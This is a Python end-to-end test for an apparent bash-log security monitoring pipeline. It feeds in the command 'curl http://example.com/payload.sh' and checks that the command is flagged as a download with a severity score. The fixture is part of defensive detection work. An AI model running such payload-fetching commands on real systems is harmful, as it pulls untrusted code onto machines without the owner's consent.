import threading

from src.adapters.collectors.bash_log_collector_adapter import BashLogCollectorAdapter
from src.adapters.parsers.bash_parser_adapter import BashParserAdapter
from src.application.collector_thread import CollectorThread
from src.application.pipeline import Pipeline
from src.ports.outbound.log_enricher_port import LogEnricher
from src.ports.outbound.publisher_port import Publisher


class InMemoryEnricher(LogEnricher):
    def __init__(self):
        super().__init__()
        self.entries = []

    def enrich(self, entry):
        self.entries.append(entry)
        return entry


class InMemoryPublisher(Publisher):
    def __init__(self):
        super().__init__()
        self.events = []

    def publish(self, entry):
        self.events.append(entry)


def test_bash_end_to_end_flow():
    collector = BashLogCollectorAdapter("/tmp/bash.log")
    collector.collect = lambda stop_event: iter(["curl http://example.com/payload.sh"])
    enricher = InMemoryEnricher()
    publisher = InMemoryPublisher()
    pipeline = Pipeline(
        parsers={"bash": BashParserAdapter("/tmp/bash.log")},
        enrichers=[enricher],
        publishers=[publisher],
    )

    CollectorThread(collector, pipeline, threading.Event()).run()

    assert len(enricher.entries) == 0
    assert len(publisher.events) == 1
    event = publisher.events[0]
    assert event.source == "bash"
    assert event.cmd == "curl http://example.com/payload.sh"
    assert event.action == "download"
    assert event.severity_score == 4
